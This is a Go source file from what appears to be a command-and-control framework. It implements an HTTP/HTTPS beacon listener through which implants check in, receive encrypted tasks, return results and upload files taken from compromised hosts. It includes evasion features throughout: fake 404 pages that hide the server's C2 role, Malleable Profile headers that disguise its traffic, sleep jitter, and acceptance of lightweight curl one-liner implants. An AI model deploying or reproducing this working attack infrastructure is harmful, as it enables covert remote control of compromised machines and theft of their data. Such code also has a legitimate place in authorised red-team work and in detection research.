package c2

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"crypto/subtle"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"math/big"
	mrand "math/rand"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"kestrel/internal/database"

	"go.uber.org/zap"
)

// HTTPBeaconListener implements HTTP/HTTPS Beacon:
//   - the beacon periodically POSTs to {checkin_path} (with implant_token + AES-encrypted body);
//   - the server decrypts, registers the session, and replies with sleep + has_tasks flag;
//   - when has_tasks=true, the beacon GETs {tasks_path} to pull the encrypted task list;
//   - after completing a task, the beacon POSTs to {result_path} to return the result.
//
// Advantages: all tasks are asynchronous and batchable, supports file upload/screenshots/arbitrary blobs; this is the C2 "main arena".
type HTTPBeaconListener struct {
	rec     *database.C2Listener
	cfg     *ListenerConfig
	manager *Manager
	logger  *zap.Logger
	useTLS  bool
	profile *database.C2Profile

	srv     *http.Server
	mu      sync.Mutex
	stopCh  chan struct{}
	stopped bool
}

// NewHTTPBeaconListener is the factory (registered to ListenerRegistry["http_beacon"])
func NewHTTPBeaconListener(ctx ListenerCreationCtx) (Listener, error) {
	return &HTTPBeaconListener{
		rec:     ctx.Listener,
		cfg:     ctx.Config,
		manager: ctx.Manager,
		logger:  ctx.Logger,
		useTLS:  false,
		stopCh:  make(chan struct{}),
	}, nil
}

// NewHTTPSBeaconListener is the factory (registered to ListenerRegistry["https_beacon"])
func NewHTTPSBeaconListener(ctx ListenerCreationCtx) (Listener, error) {
	return &HTTPBeaconListener{
		rec:     ctx.Listener,
		cfg:     ctx.Config,
		manager: ctx.Manager,
		logger:  ctx.Logger,
		useTLS:  true,
		stopCh:  make(chan struct{}),
	}, nil
}

// Type typestring
func (l *HTTPBeaconListener) Type() string {
	if l.useTLS {
		return string(ListenerTypeHTTPSBeacon)
	}
	return string(ListenerTypeHTTPBeacon)
}

// Start starts the HTTP server
func (l *HTTPBeaconListener) Start() error {
	// Load Malleable Profile if configured
	l.loadProfile()

	mux := http.NewServeMux()
	mux.HandleFunc(l.cfg.BeaconCheckInPath, l.withProfileHeaders(l.handleCheckIn))
	mux.HandleFunc(l.cfg.BeaconTasksPath, l.withProfileHeaders(l.handleTasks))
	mux.HandleFunc(l.cfg.BeaconResultPath, l.withProfileHeaders(l.handleResult))
	mux.HandleFunc(l.cfg.BeaconUploadPath, l.withProfileHeaders(l.handleUpload))
	mux.HandleFunc(l.cfg.BeaconFilePath, l.withProfileHeaders(l.handleFileServe))

	addr := fmt.Sprintf("%s:%d", l.rec.BindHost, l.rec.BindPort)
	l.srv = &http.Server{
		Addr:              addr,
		Handler:           mux,
		ReadHeaderTimeout: 15 * time.Second,
		ReadTimeout:       60 * time.Second,
		WriteTimeout:      120 * time.Second,
		IdleTimeout:       300 * time.Second,
	}

	ln, err := net.Listen("tcp", addr)
	if err != nil {
		if isAddrInUse(err) {
			return ErrPortInUse
		}
		return err
	}

	if l.useTLS {
		tlsConfig, err := l.buildTLSConfig()
		if err != nil {
			_ = ln.Close()
			return fmt.Errorf("build TLS config: %w", err)
		}
		l.srv.TLSConfig = tlsConfig
		go func() {
			if err := l.srv.ServeTLS(ln, "", ""); err != nil && !errors.Is(err, http.ErrServerClosed) {
				l.logger.Warn("https_beacon ServeTLS exited", zap.Error(err))
			}
		}()
	} else {
		go func() {
			if err := l.srv.Serve(ln); err != nil && !errors.Is(err, http.ErrServerClosed) {
				l.logger.Warn("http_beacon Serve exited", zap.Error(err))
			}
		}()
	}
	return nil
}

// Stop close
func (l *HTTPBeaconListener) Stop() error {
	l.mu.Lock()
	if l.stopped {
		l.mu.Unlock()
		return nil
	}
	l.stopped = true
	close(l.stopCh)
	l.mu.Unlock()
	if l.srv != nil {
		ctx, cancel := contextWithTimeout(5 * time.Second)
		defer cancel()
		_ = l.srv.Shutdown(ctx)
	}
	return nil
}

// ----------------------------------------------------------------------------
// HTTP handlers
// ----------------------------------------------------------------------------

func (l *HTTPBeaconListener) handleCheckIn(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !l.checkImplantToken(r) {
		l.disguisedReject(w)
		return
	}
	body, err := io.ReadAll(http.MaxBytesReader(w, r.Body, 1<<20))
	if err != nil {
		http.Error(w, "read failed", http.StatusBadRequest)
		return
	}

	// Attempt AES-GCM decryption (full beacon binary uses the encrypted channel)
	var req ImplantCheckInRequest
	plaintext, decErr := DecryptAESGCM(l.rec.EncryptionKey, string(body))
	if decErr == nil {
		if err := json.Unmarshal(plaintext, &req); err != nil {
			l.disguisedReject(w)
			return
		}
	} else {
		// Decryption failed: try as plaintext JSON (compatible with curl one-liner and other lightweight clients)
		if err := json.Unmarshal(body, &req); err != nil {
			l.disguisedReject(w)
			return
		}
	}
	isPlaintext := decErr != nil

	if req.UserAgent == "" {
		req.UserAgent = r.UserAgent()
	}
	if req.SleepSeconds <= 0 {
		req.SleepSeconds = l.cfg.DefaultSleep
	}
	// curl one-liner may not carry all fields; generate a stable identity from remote IP + listener ID
	host, _, _ := net.SplitHostPort(r.RemoteAddr)
	if strings.TrimSpace(req.ImplantUUID) == "" {
		// Same-client credentials reuse the session; different clients from the same IP retain separate identities
		req.ImplantUUID = fmt.Sprintf("curl_%s_%s", host, httpIdentityHash(host+l.rec.ID+r.Header.Get("X-Session-Token")))
	}
	if strings.TrimSpace(req.Hostname) == "" {
		req.Hostname = "curl_" + host
	}
	if strings.TrimSpace(req.InternalIP) == "" {
		req.InternalIP = host
	}
	if strings.TrimSpace(req.OS) == "" {
		req.OS = "unknown"
	}
	if strings.TrimSpace(req.Arch) == "" {
		req.Arch = "unknown"
	}
	bound, bindErr := l.manager.DB().BindC2HTTPIdentity(l.rec.ID, req.ImplantUUID, r.Header.Get("X-Session-Token"))
	if bindErr != nil || !bound {
		l.disguisedReject(w)
		return
	}
	session, err := l.manager.IngestCheckIn(l.rec.ID, req)
	if err != nil {
		http.Error(w, "ingest failed", http.StatusInternalServerError)
		return
	}
	queued, _ := l.manager.DB().ListC2Tasks(database.ListC2TasksFilter{
		SessionID: session.ID,
		Status:    string(TaskQueued),
		Limit:     1,
	})
	resp := ImplantCheckInResponse{
		SessionID:  session.ID,
		NextSleep:  session.SleepSeconds,
		NextJitter: session.JitterPercent,
		HasTasks:   len(queued) > 0,
		ServerTime: time.Now().UnixMilli(),
	}
	if isPlaintext {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(resp)
	} else {
		l.writeEncrypted(w, resp)
	}
}

func (l *HTTPBeaconListener) handleTasks(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !l.checkImplantToken(r) {
		l.disguisedReject(w)
		return
	}
	sessionID := r.URL.Query().Get("session_id")
	if sessionID == "" {
		l.disguisedReject(w)
		return
	}
	session, err := l.manager.DB().GetC2Session(sessionID)
	if err != nil || session == nil || session.ListenerID != l.rec.ID || !l.authenticatesSession(r, session) {
		l.disguisedReject(w)
		return
	}
	envelopes, err := l.manager.PopTasksForBeacon(sessionID, 50)
	if err != nil {
		http.Error(w, "pop tasks failed", http.StatusInternalServerError)
		return
	}
	if envelopes == nil {
		envelopes = []TaskEnvelope{}
	}
	resp := map[string]interface{}{"tasks": envelopes}
	if l.isPlaintextClient(r) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(resp)
	} else {
		l.writeEncrypted(w, resp)
	}
}

func (l *HTTPBeaconListener) handleResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !l.checkImplantToken(r) {
		l.disguisedReject(w)
		return
	}
	body, err := io.ReadAll(http.MaxBytesReader(w, r.Body, 64<<20))
	if err != nil {
		http.Error(w, "read failed", http.StatusBadRequest)
		return
	}
	var report TaskResultReport
	plaintext, decErr := DecryptAESGCM(l.rec.EncryptionKey, string(body))
	if decErr != nil {
		l.disguisedReject(w)
		return
	}
	if err := json.Unmarshal(plaintext, &report); err != nil {
		l.disguisedReject(w)
		return
	}
	task, taskErr := l.manager.DB().GetC2Task(report.TaskID)
	if taskErr != nil || task == nil {
		l.disguisedReject(w)
		return
	}
	session, sessionErr := l.manager.DB().GetC2Session(task.SessionID)
	if sessionErr != nil || !l.authenticatesSession(r, session) {
		l.disguisedReject(w)
		return
	}
	if err := l.manager.IngestTaskResultFromListener(l.rec.ID, session.ID, report); err != nil {
		http.Error(w, "ingest result failed", http.StatusInternalServerError)
		return
	}
	resp := map[string]string{"ok": "1"}
	if l.isPlaintextClient(r) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(resp)
	} else {
		l.writeEncrypted(w, resp)
	}
}

// handleUpload implements implant-initiated file upload to the server (e.g. binary result of a download task).
// Body is AES-GCM-encrypted base64, consistent with the security policy of check-in/result.
func (l *HTTPBeaconListener) handleUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !l.checkImplantToken(r) {
		l.disguisedReject(w)
		return
	}
	taskID := r.URL.Query().Get("task_id")
	if taskID == "" || !l.authenticatesTask(r, taskID) {
		l.disguisedReject(w)
		return
	}
	body, err := io.ReadAll(http.MaxBytesReader(w, r.Body, 256<<20))
	if err != nil {
		http.Error(w, "read failed", http.StatusBadRequest)
		return
	}
	plaintext, err := DecryptAESGCM(l.rec.EncryptionKey, string(body))
	if err != nil {
		l.disguisedReject(w)
		return
	}
	dir, dst, err := uploadPathForTask(l.manager.StorageDir(), taskID)
	if err != nil {
		l.disguisedReject(w)
		return
	}
	if err := os.MkdirAll(dir, 0o755); err != nil {
		http.Error(w, "mkdir failed", http.StatusInternalServerError)
		return
	}
	if err := os.WriteFile(dst, plaintext, 0o644); err != nil {
		http.Error(w, "save failed", http.StatusInternalServerError)
		return
	}
	l.writeEncrypted(w, map[string]interface{}{"ok": 1, "size": len(plaintext)})
}

// handleFileServe implements server → implant file delivery (used for upload tasks).
// The path looks like /file/<task_id>; file content is AES-GCM-encrypted before returning.
func (l *HTTPBeaconListener) handleFileServe(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !l.checkImplantToken(r) {
		l.disguisedReject(w)
		return
	}
	prefix := l.cfg.BeaconFilePath
	taskID := strings.TrimPrefix(r.URL.Path, prefix)
	taskID = strings.TrimSuffix(taskID, ".bin")
	if taskID == "" || strings.Contains(taskID, "/") || strings.Contains(taskID, "\\") || strings.Contains(taskID, "..") {
		l.disguisedReject(w)
		return
	}
	identities, identityErr := l.manager.DB().C2HTTPFileIdentities(l.rec.ID, taskID)
	authenticated := false
	if identityErr == nil {
		for _, identity := range identities {
			ok, err := l.manager.DB().VerifyC2HTTPIdentity(l.rec.ID, identity, r.Header.Get("X-Session-Token"))
			if err == nil && ok {
				authenticated = true
				break
			}
		}
	}
	if !authenticated {
		l.disguisedReject(w)
		return
	}
	fpath := filepath.Join(l.manager.StorageDir(), "downstream", taskID+".bin")
	absPath, err := filepath.Abs(fpath)
	if err != nil {
		l.disguisedReject(w)
		return
	}
	absDir, err := filepath.Abs(filepath.Join(l.manager.StorageDir(), "downstream"))
	if err != nil || !strings.HasPrefix(absPath, absDir+string(filepath.Separator)) {
		l.disguisedReject(w)
		return
	}
	data, err := os.ReadFile(absPath)
	if err != nil {
		l.disguisedReject(w)
		return
	}
	l.writeEncrypted(w, map[string]interface{}{
		"file_data": base64Encode(data),
	})
}

// ----------------------------------------------------------------------------
// Authentication / output helpers
// ----------------------------------------------------------------------------

func (l *HTTPBeaconListener) authenticatesSession(r *http.Request, session *database.C2Session) bool {
	if session == nil || session.ListenerID != l.rec.ID {
		return false
	}
	ok, err := l.manager.DB().VerifyC2HTTPIdentity(l.rec.ID, session.ImplantUUID, r.Header.Get("X-Session-Token"))
	return err == nil && ok
}

func (l *HTTPBeaconListener) authenticatesTask(r *http.Request, taskID string) bool {
	task, err := l.manager.DB().GetC2Task(taskID)
	if err != nil || task == nil {
		return false
	}
	session, err := l.manager.DB().GetC2Session(task.SessionID)
	return err == nil && l.authenticatesSession(r, session)
}

// checkImplantToken validates the X-Implant-Token header (constant-time comparison to prevent timing attacks)
func (l *HTTPBeaconListener) checkImplantToken(r *http.Request) bool {
	got := r.Header.Get("X-Implant-Token")
	if got == "" {
		got = r.Header.Get("Cookie") // compatible with Malleable Profile carrying the token via Cookie
	}
	expected := l.rec.ImplantToken
	if got == "" || expected == "" {
		return false
	}
	return subtle.ConstantTimeCompare([]byte(got), []byte(expected)) == 1
}

// disguisedReject returns 404 on authentication failure to avoid exposing that the listener is a C2
func (l *HTTPBeaconListener) disguisedReject(w http.ResponseWriter) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusNotFound)
	_, _ = fmt.Fprint(w, "<html><body><h1>404 Not Found</h1></body></html>")
}

// writeEncrypted JSON-serialises + AES-GCM-encrypts + writes the response
func (l *HTTPBeaconListener) writeEncrypted(w http.ResponseWriter, payload interface{}) {
	body, err := json.Marshal(payload)
	if err != nil {
		http.Error(w, "encode failed", http.StatusInternalServerError)
		return
	}
	enc, err := EncryptAESGCM(l.rec.EncryptionKey, body)
	if err != nil {
		http.Error(w, "encrypt failed", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	_, _ = w.Write([]byte(enc))
}

// loadProfile loads Malleable Profile from DB if the listener has a profile_id configured
func (l *HTTPBeaconListener) loadProfile() {
	if l.rec.ProfileID == "" {
		return
	}
	profile, err := l.manager.GetProfile(l.rec.ProfileID)
	if err != nil || profile == nil {
		l.logger.Warn("failed to load Malleable Profile, using default config",
			zap.String("profile_id", l.rec.ProfileID), zap.Error(err))
		return
	}
	l.profile = profile
	l.logger.Info("Malleable Profile loaded",
		zap.String("profile_id", profile.ID),
		zap.String("profile_name", profile.Name),
		zap.String("user_agent", profile.UserAgent))
}

// withProfileHeaders wraps a handler to inject Malleable Profile response headers
func (l *HTTPBeaconListener) withProfileHeaders(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if l.profile != nil && len(l.profile.ResponseHeaders) > 0 {
			for k, v := range l.profile.ResponseHeaders {
				w.Header().Set(k, v)
			}
		}
		next(w, r)
	}
}

// ----------------------------------------------------------------------------
// TLS self-signed certificate (for testing / Phase 2 default behaviour only)
// ----------------------------------------------------------------------------

func (l *HTTPBeaconListener) buildTLSConfig() (*tls.Config, error) {
	// Operator explicitly provided a certificate → use it first
	if l.cfg.TLSCertPath != "" && l.cfg.TLSKeyPath != "" {
		cert, err := tls.LoadX509KeyPair(l.cfg.TLSCertPath, l.cfg.TLSKeyPath)
		if err == nil {
			return &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}, nil
		}
		l.logger.Warn("failed to load TLS certificate, falling back to self-signed", zap.Error(err))
	}
	// Self-signed certificate: use listener name as CN to avoid duplicates
	cert, err := generateSelfSignedCert(l.rec.Name)
	if err != nil {
		return nil, err
	}
	return &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}, nil
}

func generateSelfSignedCert(cn string) (tls.Certificate, error) {
	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return tls.Certificate{}, err
	}
	serial, _ := rand.Int(rand.Reader, big.NewInt(1<<62))
	tmpl := &x509.Certificate{
		SerialNumber: serial,
		Subject:      pkix.Name{CommonName: cn},
		NotBefore:    time.Now().Add(-1 * time.Hour),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		IPAddresses:  []net.IP{net.ParseIP("127.0.0.1")},
		DNSNames:     []string{"localhost"},
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &priv.PublicKey, priv)
	if err != nil {
		return tls.Certificate{}, err
	}
	keyDER, err := x509.MarshalECPrivateKey(priv)
	if err != nil {
		return tls.Certificate{}, err
	}
	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
	return tls.X509KeyPair(certPEM, keyPEM)
}

func base64Encode(data []byte) string {
	return base64.StdEncoding.EncodeToString(data)
}

func httpIdentityHash(s string) string {
	h := sha256.Sum256([]byte(s))
	return hex.EncodeToString(h[:])
}

// isPlaintextClient determines whether the request comes from a plaintext client (curl one-liner, etc.)
// A full beacon binary sets Content-Type: application/octet-stream
func (l *HTTPBeaconListener) isPlaintextClient(r *http.Request) bool {
	ct := r.Header.Get("Content-Type")
	accept := r.Header.Get("Accept")
	return strings.Contains(ct, "application/json") ||
		strings.Contains(accept, "application/json") ||
		strings.Contains(r.UserAgent(), "curl/")
}

// ApplyJitter returns a randomly jittered duration given base sleep + jitter percentage.
// Exported for shared use by listener_websocket / payload templates to avoid duplicating the implementation.
func ApplyJitter(baseSec, jitterPercent int) time.Duration {
	if baseSec <= 0 {
		return 0
	}
	if jitterPercent <= 0 {
		return time.Duration(baseSec) * time.Second
	}
	if jitterPercent > 100 {
		jitterPercent = 100
	}
	delta := mrand.Intn(2*jitterPercent+1) - jitterPercent // [-j, +j]
	factor := 1.0 + float64(delta)/100.0
	return time.Duration(float64(baseSec)*factor) * time.Second
}
